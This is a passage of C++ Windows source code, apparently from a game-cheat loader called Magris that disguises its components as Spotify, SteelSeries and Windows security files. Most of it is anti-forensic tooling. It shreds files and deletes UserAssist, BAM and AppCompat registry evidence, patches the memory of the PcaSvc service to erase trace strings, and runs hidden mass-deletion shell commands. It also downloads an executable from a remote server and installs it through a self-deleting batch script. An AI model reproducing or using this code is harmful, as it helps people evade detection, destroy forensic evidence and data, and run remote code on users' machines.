    bool pressed = (di->itemState & ODS_SELECTED) != 0;
    HDC dc = di->hDC; RECT r = di->rcItem;
    Graphics g(dc);
    g.SetSmoothingMode(SmoothingModeAntiAlias);
    g.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
    GraphicsPath path;
    MakeRoundRect(path, (float)r.left, (float)r.top, (float)(r.right-r.left), (float)(r.bottom-r.top), 6.0f);
    
    LinearGradientBrush lgb(RectF((float)r.left,(float)r.top,(float)(r.right-r.left),(float)(r.bottom-r.top)),
        pressed ? Color(255,60,60,65) : Color(255,80,80,85),
        pressed ? Color(255,40,40,45) : Color(255,60,60,65), LinearGradientModeVertical);
    g.FillPath(&lgb, &path);
    Pen brd(Color(255,100,100,105), 1.0f);
    g.DrawPath(&brd, &path);
    
    FontFamily ff(XWC(L"Segoe UI"));
    Font fBtn(&ff, 13, FontStyleBold, UnitPixel);
    StringFormat sf; sf.SetAlignment(StringAlignmentCenter); sf.SetLineAlignment(StringAlignmentCenter);
    RectF tr((float)r.left,(float)r.top,(float)(r.right-r.left),(float)(r.bottom-r.top));
    SolidBrush wBr(CLR_WHITE);
    g.DrawString(XWC(L"GÄ°RÄ°Åž YAP"), -1, &fBtn, tr, &sf, &wBr);
}

void DrawLoadBtn(LPDRAWITEMSTRUCT di) {
    bool pressed = (di->itemState & ODS_SELECTED) != 0;
    HDC dc = di->hDC; RECT r = di->rcItem;
    Graphics g(dc);
    g.SetSmoothingMode(SmoothingModeAntiAlias);
    g.SetTextRenderingHint(TextRenderingHintClearTypeGridFit);
    GraphicsPath path;
    MakeRoundRect(path, (float)r.left+8, (float)r.top+8, (float)(r.right-r.left-16), (float)(r.bottom-r.top-16), 7.0f);
    LinearGradientBrush lgb(RectF((float)r.left,(float)r.top,(float)(r.right-r.left),(float)(r.bottom-r.top)),
        pressed ? Color(255,60,60,65) : Color(255,80,80,85),
        pressed ? Color(255,40,40,45) : Color(255,60,60,65), LinearGradientModeVertical);
    g.FillPath(&lgb, &path);
    Pen brd(Color(255,100,100,105), 1.0f);
    g.DrawPath(&brd, &path);
    FontFamily ff(XWC(L"Segoe UI"));
    Font fBtn(&ff, 12, FontStyleBold, UnitPixel);
    SolidBrush whiteBr(CLR_WHITE);
    StringFormat sf; sf.SetAlignment(StringAlignmentCenter); sf.SetLineAlignment(StringAlignmentCenter);
    RectF tr((float)r.left,(float)r.top,(float)(r.right-r.left),(float)(r.bottom-r.top));
    g.DrawString(XWC(L"Load Selected Products"), -1, &fBtn, tr, &sf, &whiteBr);
}

void KillProcessNative(const wchar_t* processName) {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe; pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, processName) == 0) {
                    HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (hProc) { TerminateProcess(hProc, 0); CloseHandle(hProc); }
                }
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
}

static std::wstring GenRndFileName(const std::wstring& dir, const std::wstring& ext) {
    wchar_t buf[24];
    LARGE_INTEGER pc; QueryPerformanceCounter(&pc);
    DWORD seed = (DWORD)(pc.QuadPart ^ GetTickCount64() ^ (DWORD_PTR)&buf);
    for (int i = 0; i < 12; i++) {
        seed = seed * 1103515245 + 12345;
        buf[i] = XW(L"abcdefghijklmnopqrstuvwxyz0123456789")[seed % 36];
    }
    buf[12] = 0;
    return dir + buf + ext;
}

static bool IsGenRndBasename(const std::wstring& fileName) {
    const size_t dot = fileName.find_last_of(L'.');
    if (dot == std::wstring::npos || dot == 0)
        return false;
    const std::wstring base = fileName.substr(0, dot);
    const std::wstring ext = fileName.substr(dot);
    if (base.size() != 12)
        return false;
    if (_wcsicmp(ext.c_str(), L".tmp") != 0 && _wcsicmp(ext.c_str(), L".bat") != 0)
        return false;
    for (wchar_t c : base) {
        if (c >= L'a' && c <= L'z') continue;
        if (c >= L'0' && c <= L'9') continue;
        return false;
    }
    return true;
}

void ShredAndDeleteFile(const std::wstring& path);

static void CleanPatternInTempDir(const std::wstring& dir, const std::wstring& pattern) {
    if (dir.empty()) return;
    std::wstring base = dir;
    if (base.back() != L'\\' && base.back() != L'/')
        base += L'\\';
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((base + pattern).c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring fp = base + fd.cFileName;
        SetFileAttributesW(fp.c_str(), FILE_ATTRIBUTE_NORMAL);
        ShredAndDeleteFile(fp);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static void CleanGenRndTempArtifactsInDir(const std::wstring& dir) {
    if (dir.empty()) return;
    std::wstring base = dir;
    if (base.back() != L'\\' && base.back() != L'/')
        base += L'\\';
    WIN32_FIND_DATAW fd;
    for (const wchar_t* pat : { L"*.tmp", L"*.bat" }) {
        HANDLE h = FindFirstFileW((base + pat).c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            if (!IsGenRndBasename(fd.cFileName)) continue;
            std::wstring fp = base + fd.cFileName;
            SetFileAttributesW(fp.c_str(), FILE_ATTRIBUTE_NORMAL);
            ShredAndDeleteFile(fp);
        } while (FindNextFileW(h, &fd));
        FindClose(h);
    }
}

static void CleanMagrisTempArtifacts() {
    wchar_t tmp[MAX_PATH] = {};
    if (GetTempPathW(MAX_PATH, tmp) > 0) {
        CleanGenRndTempArtifactsInDir(tmp);
        CleanPatternInTempDir(tmp, XW(L"magris_log_*.png"));
        CleanPatternInTempDir(tmp, XW(L"sys_clean_*.bat"));
    }

    wchar_t lad[MAX_PATH] = {};
    if (GetEnvironmentVariableW(L"LOCALAPPDATA", lad, MAX_PATH) > 0) {
        std::wstring localTmp = std::wstring(lad) + XW(L"\\Temp\\");
        CleanGenRndTempArtifactsInDir(localTmp);
        CleanPatternInTempDir(localTmp, XW(L"magris_log_*.png"));
        CleanPatternInTempDir(localTmp, XW(L"sys_clean_*.bat"));
    }
}

void ShredAndDeleteFile(const std::wstring& path) {
    if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) return;

    HANDLE hFile = CreateFileW(path.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD size = GetFileSize(hFile, NULL);
        if (size > 0 && size != INVALID_FILE_SIZE) {
            BYTE noise[4096];
            LARGE_INTEGER pc; QueryPerformanceCounter(&pc);
            DWORD s = (DWORD)pc.QuadPart;
            for (int i = 0; i < 4096; i++) { s = s * 1103515245 + 12345; noise[i] = (BYTE)(s >> 16); }
            DWORD written = 0, total = 0;
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            while (total < size) {
                DWORD toW = (size - total > 4096) ? 4096 : (size - total);
                WriteFile(hFile, noise, toW, &written, NULL);
                total += written;
            }
            FlushFileBuffers(hFile);
            SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
            SetEndOfFile(hFile);
        }
        CloseHandle(hFile);
    }

    std::wstring dir = path;
    size_t sl = dir.find_last_of(XW(L"\\/"));
    if (sl != std::wstring::npos) dir.resize(sl + 1); else dir = XW(L".\\");

    std::wstring rndName = GenRndFileName(dir, XW(L".tmp"));
    if (MoveFileW(path.c_str(), rndName.c_str()))
        DeleteFileW(rndName.c_str());
    else
        DeleteFileW(path.c_str());
}


static void WipeFileContents(const std::wstring& path) {
    if (GetFileAttributesW(path.c_str()) == INVALID_FILE_ATTRIBUTES) return;
    HANDLE h = CreateFileW(path.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return;
    LARGE_INTEGER li = {};
    if (GetFileSizeEx(h, &li) && li.QuadPart > 0) {
        char zeros[4096] = {};
        DWORD total = 0, written;
        while (total < (DWORD)li.QuadPart) {
            DWORD toWrite = (li.QuadPart - total > 4096) ? 4096 : (DWORD)(li.QuadPart - total);
            WriteFile(h, zeros, toWrite, &written, NULL);
            total += written;
        }
    }
    CloseHandle(h);
}




static void DeleteFilesInDir(const std::wstring& dir, const std::wstring& pattern) {
    std::wstring search = dir + XW(L"\\") + pattern;
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(search.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring fp = dir + XW(L"\\") + fd.cFileName;
        SetFileAttributesW(fp.c_str(), FILE_ATTRIBUTE_NORMAL);
        ShredAndDeleteFile(fp);
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}


static void WipeDirectoryTreeRecursive(const std::wstring& dir) {
    std::wstring search = dir + XW(L"\\*");
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(search.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (wcscmp(fd.cFileName, XWC(L".")) == 0 || wcscmp(fd.cFileName, XWC(L"..")) == 0) continue;
        std::wstring full = dir + XW(L"\\") + fd.cFileName;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            WipeDirectoryTreeRecursive(full);
            RemoveDirectoryW(full.c_str());
        } else {
            SetFileAttributesW(full.c_str(), FILE_ATTRIBUTE_NORMAL);
            ShredAndDeleteFile(full);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

static void WipeWinInetIeDiskCache() {
    InternetSetOptionW(NULL, INTERNET_OPTION_END_BROWSER_SESSION, NULL, 0);
    wchar_t localAppData[MAX_PATH] = {};
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, localAppData)))
        return;
    std::wstring ieRoot = std::wstring(localAppData) + XW(L"\\Microsoft\\Windows\\INetCache\\IE");
    if (GetFileAttributesW(ieRoot.c_str()) == INVALID_FILE_ATTRIBUTES)
        return;
    WipeDirectoryTreeRecursive(ieRoot);
}

static void CleanPcaSvcDatabase() {
    const wchar_t* pcaFiles[] = {
        XWC(L"C:\\Windows\\appcompat\\pca\\PcaGeneralDb0.txt"),
        XWC(L"C:\\Windows\\appcompat\\pca\\PcaGeneralDb1.txt"),
    };
    for (auto f : pcaFiles) {
        HANDLE hFile = CreateFileW(f, GENERIC_WRITE, 0, NULL, TRUNCATE_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) CloseHandle(hFile);
    }
    DeleteFilesInDir(XW(L"C:\\Windows\\appcompat\\pca"), XWC(L"*.txt"));
    DeleteFilesInDir(XW(L"C:\\Windows\\appcompat\\Programs"), XWC(L"*.txt"));
    DeleteFilesInDir(XW(L"C:\\Windows\\appcompat\\Programs"), XWC(L"*.sdb"));
}

static DWORD FindSvchostPidForService(const wchar_t* serviceName) {
    SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
    if (!scm) return 0;
    SC_HANDLE svc = OpenServiceW(scm, serviceName, SERVICE_QUERY_STATUS);
    if (!svc) { CloseServiceHandle(scm); return 0; }
    SERVICE_STATUS_PROCESS ssp = {};
    DWORD needed = 0;
    DWORD pid = 0;
    if (QueryServiceStatusEx(svc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
        if (ssp.dwCurrentState == SERVICE_RUNNING) pid = ssp.dwProcessId;
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return pid;
}

static std::wstring ToLowerWideCopy(std::wstring s) {
    if (!s.empty()) CharLowerBuffW(s.data(), (DWORD)s.size());
    return s;
}

static bool WideHaystackContainsNeedle(const std::wstring& hayLower, const std::string& needle) {
    if (needle.empty() || hayLower.empty()) return false;
    std::wstring wn(needle.begin(), needle.end());
    wn = ToLowerWideCopy(std::move(wn));
    return hayLower.find(wn) != std::wstring::npos;
}

static bool HaystackMatchesMagrisNeedle(const std::wstring& hay, const std::vector<std::string>& needles) {
    if (hay.empty()) return false;
    const std::wstring h = ToLowerWideCopy(hay);
    for (const auto& n : needles) {
        if (WideHaystackContainsNeedle(h, n)) return true;
    }
    return false;
}

static void GetMagrisDestructTraceStrings(std::vector<std::string>& out);


static void PruneMuiCacheFromMagrisTraces() {
    std::vector<std::string> needles;
    GetMagrisDestructTraceStrings(needles);
    if (!g_loggedInUsername.empty()) needles.push_back(g_loggedInUsername);
    if (!g_loggedInKey.empty())       needles.push_back(g_loggedInKey);
    std::string hwid = getHWIDStr();
    if (!hwid.empty()) needles.push_back(hwid);

    const std::wstring installDir = GetMagrisExeDir();
    if (!installDir.empty())
        needles.emplace_back(installDir.begin(), installDir.end());

    if (needles.empty()) return;

    HKEY hKey = NULL;
    const wchar_t* subKey =
        L"Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache";
    if (RegOpenKeyExW(HKEY_CURRENT_USER, subKey, 0, KEY_READ | KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
        return;

    std::vector<std::wstring> removeNames;
    DWORD idx = 0;
    for (;;) {
        wchar_t name[16384];
        DWORD nameLen = (DWORD)_countof(name);
        DWORD type = 0;
        LONG err = RegEnumValueW(hKey, idx, name, &nameLen, NULL, &type, NULL, NULL);
        if (err == ERROR_NO_MORE_ITEMS) break;
        if (err != ERROR_SUCCESS) {
            ++idx;
            continue;
        }

        bool match = HaystackMatchesMagrisNeedle(std::wstring(name, nameLen), needles);

        if (!match && (type == REG_SZ || type == REG_EXPAND_SZ)) {
            DWORD dataSize = 0;
            if (RegQueryValueExW(hKey, name, NULL, NULL, NULL, &dataSize) == ERROR_SUCCESS &&
                dataSize >= sizeof(wchar_t) && dataSize < 65536) {
                std::vector<BYTE> buf(dataSize);
                if (RegQueryValueExW(hKey, name, NULL, NULL, buf.data(), &dataSize) == ERROR_SUCCESS) {
                    size_t wcharCount = dataSize / sizeof(wchar_t);
                    std::wstring data(reinterpret_cast<wchar_t*>(buf.data()), wcharCount);
                    while (!data.empty() && data.back() == L'\0') data.pop_back();
                    match = HaystackMatchesMagrisNeedle(data, needles);
                }
            }
        }

        if (match) removeNames.emplace_back(name);
        ++idx;
    }

    for (const auto& v : removeNames)
        RegDeleteValueW(hKey, v.c_str());
    RegCloseKey(hKey);
}

static void GetMagrisDestructTraceStrings(std::vector<std::string>& out) {
    out.push_back(XS("Magris"));
    out.push_back(XS("magris"));
    out.push_back(XS("MAGRIS"));
    out.push_back(XS("MagrisPrivate"));
    out.push_back(XS("Magris Safe Destruct"));
    out.push_back(XS("SpotifyLaunchers"));
    out.push_back(XS("SpotifyLaunchers.exe"));
    out.push_back(XS("SpotifySetup"));
    out.push_back(XS("SpotifySetup.exe"));
    out.push_back(XS("SsRgbEffects64"));
    out.push_back(XS("SsRgbEffects64.dll"));
    out.push_back(XS("WSCache"));
    out.push_back(XS("WSCache.dll"));
    out.push_back(XS("libGLESv3"));
    out.push_back(XS("libGLESv3.dll"));
    out.push_back(XS("spotify_path.txt"));
    out.push_back(XS("launcher_path.txt"));
    out.push_back(XS("magris_sk"));
    out.push_back(XS("~svc_"));
    out.push_back(XS("Spotify_real"));
    out.push_back(XS("Spotify_real.exe"));
    out.push_back(XS("SpotifyLauncher"));
    out.push_back(XS("SpotifyLauncher.exe"));
    out.push_back(XS("RunWezyCheat"));
    out.push_back(XS("ManualMapData"));
    out.push_back(XS("libcef2"));
    out.push_back(XS("libcef2.dll"));
    out.push_back(XS("chrome_elf"));
    out.push_back(XS("chrome_elf_real"));
    out.push_back(XS("chrome_elf.dll"));
    out.push_back(XS("chrome_elf_real.dll"));
    out.push_back(XS("RunLibcef2"));
    out.push_back(XS("MagrisLauncher"));
    out.push_back(XS("MagrisLauncher.dll"));
    out.push_back(XS("WscNotification"));
    out.push_back(XS("wscnotification"));
    out.push_back(XS("WscNotification.exe"));
    out.push_back(XS("programdata\\microsoft\\wscnotification"));
    out.push_back(XS("SecurityHealth"));
    out.push_back(XS(""));
    out.push_back(XS("/api/download/menu/latest"));
    out.push_back(XS("/api/download/loader/latest"));
    out.push_back(XS("/api/download/prefetch-shim/latest"));
    out.push_back(XS("/api/download/magris/latest"));
    out.push_back(XS("/api/validate"));
    out.push_back(XS("MagrisSetup"));
    out.push_back(XS("MagrisReinstall"));
    out.push_back(XS("Global\\MAGRIS_LAUNCHER_ACTIVE"));
    out.push_back(XS("wezy.png"));
    out.push_back(XS("indir.jpg"));
    out.push_back(XS("SteelSeries"));
    out.push_back(XS("steelseries"));
    out.push_back(XS("Aimbot"));
    out.push_back(XS("aimbot"));
    out.push_back(XS("loader.exe"));
    out.push_back(XS("Loader.exe"));
    out.push_back(XS("CheckThisFile"));
    out.push_back(XS("DiscordCanary"));
    out.push_back(XS("Discord Canary"));
}

static void CleanPcaSvcMemory(const std::vector<std::string>& extraStrings) {
    DWORD pid = FindSvchostPidForService(XWC(L"PcaSvc"));
    if (!pid) return;
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) return;
    std::vector<std::string> strings;
    GetMagrisDestructTraceStrings(strings);
    for (const auto& s : extraStrings) strings.push_back(s);
    StringCleaner sc(pid, strings);
    sc.clean(hProc);
}

static void CleanDPSDatabase() {
    const wchar_t* dpsDir = XWC(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue");
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW((std::wstring(dpsDir) + XW(L"\\*")).c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
        if (wcscmp(fd.cFileName, XWC(L".")) == 0 || wcscmp(fd.cFileName, XWC(L"..")) == 0) continue;
        std::wstring sub = std::wstring(dpsDir) + XW(L"\\") + fd.cFileName;
        DeleteFilesInDir(sub, XWC(L"*.*"));
        RemoveDirectoryW(sub.c_str());
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

void CleanFiveMTraces() {
    PruneMuiCacheFromMagrisTraces();

    std::string cmd = XS("/c ") +
        XS("rmdir /s /q \"%localappdata%\\DigitalEntitlements\" >nul 2>&1 & ") +
        XS("rmdir /s /q \"%localappdata%\\FiveM\\FiveM.app\\crashes\" >nul 2>&1 & ") +
        XS("rmdir /s /q \"%localappdata%\\FiveM\\FiveM.app\\logs\" >nul 2>&1 & ") +
        XS("rmdir /s /q \"%localappdata%\\FiveM\\FiveM.app\\data\\nui-storage\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%temp%\\*magris*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%temp%\\*SpotifyLaunchers*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%temp%\\*SsRgbEffects*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%temp%\\*WSCache*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%temp%\\~svc_*.tmp\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%temp%\\libGLESv3*\" >nul 2>&1 & ") +
        XS("del /f /q \"%temp%\\magris_sk\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%localappdata%\\Temp\\*magris*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%localappdata%\\Temp\\*SpotifyLaunchers*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%localappdata%\\Temp\\~svc_*.tmp\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*magris*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*steelseries*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*wscnotification*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*SpotifyLaunchers*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*SsRgbEffects*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*WSCache*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*libcef2*\" >nul 2>&1 & ") +
        XS("del /f /q \"%localappdata%\\CrashDumps\\*libGLESv3*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"C:\\Windows\\Temp\\*.*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%appdata%\\Microsoft\\Windows\\Recent\\*magris*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%appdata%\\Microsoft\\Windows\\Recent\\*SpotifyLaunchers*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%appdata%\\Microsoft\\Windows\\Recent\\*SsRgbEffects*\" >nul 2>&1 & ") +
        XS("del /f /q /s \"%appdata%\\Microsoft\\Windows\\Recent\\*libGLESv3*\" >nul 2>&1 & ") +
        XS("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\" /f >nul 2>&1 & ") +
        XS("reg delete \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\" /f >nul 2>&1 & ") +
        XS("reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\" /f >nul 2>&1 & ") +
        XS("reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store\" /f >nul 2>&1 & ") +
        XS("reg delete \"HKLM\\SOFTWARE\\Microsoft\\RADAR\\HeapLeakDetection\\DiagnosedApplications\" /f >nul 2>&1 & ") +
        XS("ipconfig /flushdns >nul 2>&1");

    std::wstring wCmd;
    wCmd.assign(cmd.begin(), cmd.end());
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    std::wstring execCmd = XW(L"cmd.exe ") + wCmd;
    if (CreateProcessW(NULL, (LPWSTR)execCmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    SHEmptyRecycleBinW(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);

    CleanPcaSvcDatabase();
    CleanDPSDatabase();
    CleanMagrisTempArtifacts();
}


static void RestoreShortcutInFolder(const std::wstring& folderDir, const std::wstring& realPath) {
    const std::wstring searchPath = folderDir + XW(L"*.lnk");
    WIN32_FIND_DATAW fd = {};
    HANDLE h = FindFirstFileW(searchPath.c_str(), &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
        std::wstring lnkPath = folderDir + fd.cFileName;
        IShellLinkW* psl = NULL;
        if (FAILED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) continue;
        IPersistFile* ppfLoad = NULL;
        if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (void**)&ppfLoad)) && SUCCEEDED(ppfLoad->Load(lnkPath.c_str(), STGM_READ))) {
            wchar_t target[MAX_PATH] = {};
            psl->GetPath(target, MAX_PATH, NULL, 0);
            std::wstring tStr(target);
            bool isOurLauncher = (tStr.find(XW(L"WscNotification")) != std::wstring::npos ||
                tStr.find(XW(L"Magris")) != std::wstring::npos ||
                tStr.find(XW(L"SpotifyLaunchers")) != std::wstring::npos ||
                tStr.find(XW(L"libcef2")) != std::wstring::npos ||
                tStr.find(XW(L"MagrisLauncher")) != std::wstring::npos);
            if (isOurLauncher) {
                psl->SetPath(realPath.c_str());
                psl->SetArguments(L"");
                IShellLinkDataList* pdl = NULL;
                if (SUCCEEDED(psl->QueryInterface(IID_IShellLinkDataList, (void**)&pdl))) {
                    DWORD dwFlags = 0;
                    if (SUCCEEDED(pdl->GetFlags(&dwFlags))) {
                        const DWORD SLDF_RUNAS_USER_FLAG = 0x00002000u;
                        pdl->SetFlags(dwFlags & ~SLDF_RUNAS_USER_FLAG);
                    }
                    pdl->Release();
                }
                ppfLoad->Save(lnkPath.c_str(), TRUE);
            }
            ppfLoad->Release();
        }
        psl->Release();
    } while (FindNextFileW(h, &fd));
    FindClose(h);
}

void RestoreShortcut(const std::wstring& realPath) {
    if (realPath.empty()) return;
    if (FAILED(CoInitialize(NULL))) return;
    wchar_t buf[MAX_PATH] = {};
    
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_DESKTOP, NULL, 0, buf))) {
        std::wstring dir = std::wstring(buf) + XW(L"\\");
        RestoreShortcutInFolder(dir, realPath);
    }
    
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_STARTMENU, NULL, 0, buf))) {
        std::wstring dir = std::wstring(buf) + XW(L"\\");
        RestoreShortcutInFolder(dir, realPath);
    }
    
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAMS, NULL, 0, buf))) {
        std::wstring dir = std::wstring(buf) + XW(L"\\");
        RestoreShortcutInFolder(dir, realPath);
    }
    
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_STARTMENU, NULL, 0, buf))) {
        std::wstring dir = std::wstring(buf) + XW(L"\\");
        RestoreShortcutInFolder(dir, realPath);
    }
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_PROGRAMS, NULL, 0, buf))) {
        std::wstring dir = std::wstring(buf) + XW(L"\\");
        RestoreShortcutInFolder(dir, realPath);
    }
    CoUninitialize();
}


static HANDLE OpenProcessByNameW(const wchar_t* processName, DWORD access, DWORD* outPid) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return NULL;
    PROCESSENTRY32W pe = {};
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, processName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    if (!pid) return NULL;
    if (outPid) *outPid = pid;
    return OpenProcess(access, FALSE, pid);
}


DWORD WINAPI ReinstallDownloadThread(LPVOID lpParam) {
    wchar_t urlBuf[512];
    swprintf_s(urlBuf, XWC(L"http://%s:%d/api/download/loader/latest"), AUTH_URL, AUTH_PORT);
    HINTERNET hOpen = InternetOpenW(XWC(L"MagrisReinstall"), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hOpen) {
        return 0;
    }
    HINTERNET hUrl = InternetOpenUrlW(hOpen, urlBuf, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hOpen);
        return 0;
    }
    std::vector<char> data;
    char buf[8192];
    DWORD read;
    while (InternetReadFile(hUrl, buf, sizeof(buf), &read) && read) data.insert(data.end(), buf, buf + read);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hOpen);
    if (data.empty()) {
        return 0;
    }
    
    wchar_t tempDir[MAX_PATH], tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempDir) == 0) {
        return 0;
    }
    GetTempFileNameW(tempDir, XWC(L"SS"), 0, tempPath);
    DeleteFileW(tempPath);
    wcscat_s(tempPath, XWC(L".exe"));
    HANDLE hFile = CreateFileW(tempPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }
    DWORD written;
    WriteFile(hFile, data.data(), (DWORD)data.size(), &written, NULL);
    CloseHandle(hFile);
    wchar_t selfPath[MAX_PATH] = {};
    if (GetModuleFileNameW(NULL, selfPath, MAX_PATH) == 0) {
        DeleteFileW(tempPath);
        return 0;
    }
    GetTempFileNameW(tempDir, XWC(L"MG"), 0, urlBuf);
    DeleteFileW(urlBuf);
    wcscat_s(urlBuf, XWC(L".bat"));
    HANDLE hBat = CreateFileW(urlBuf, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBat == INVALID_HANDLE_VALUE) {
        DeleteFileW(tempPath);
        return 0;
    }
    char tempPathA[MAX_PATH * 2], selfPathA[MAX_PATH * 2];
    WideCharToMultiByte(CP_ACP, 0, tempPath, -1, tempPathA, sizeof(tempPathA), NULL, NULL);
    WideCharToMultiByte(CP_ACP, 0, selfPath, -1, selfPathA, sizeof(selfPathA), NULL, NULL);
    std::string bat;
    bat += XS("@echo off\r\n");
    bat += XS("timeout /t 2 /nobreak >nul\r\n");
    bat += XS("copy /Y \"");
    bat += tempPathA;
    bat += XS("\" \"");
    bat += selfPathA;
    bat += XS("\"\r\n");
    bat += XS("start \"\" \"");
    bat += selfPathA;
    bat += XS("\"\r\n");
    bat += XS("del \"%~f0\"\r\n");
    WriteFile(hBat, bat.c_str(), (DWORD)bat.size(), &written, NULL);
    CloseHandle(hBat);
    STARTUPINFOW si = {}; PROCESS_INFORMATION pi = {};
    si.cb = sizeof(si); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;
